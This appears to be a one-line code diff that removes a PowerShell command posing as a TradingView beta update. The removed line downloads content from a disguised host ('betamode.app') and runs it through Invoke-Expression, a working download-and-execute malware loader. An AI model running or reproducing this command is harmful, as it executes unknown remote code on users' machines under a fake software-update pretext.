@@ -1,1 +1,0 @@
-powershell -command "$tradingview='.app';$version='3.9.1_AI_Beta';$update='betamode'+$tradingview;$app=(Invoke-WebRequest $update -UseBasicParsing).Content;([Text.Encoding]::UTF8.GetString($app))|Invoke-Expression"
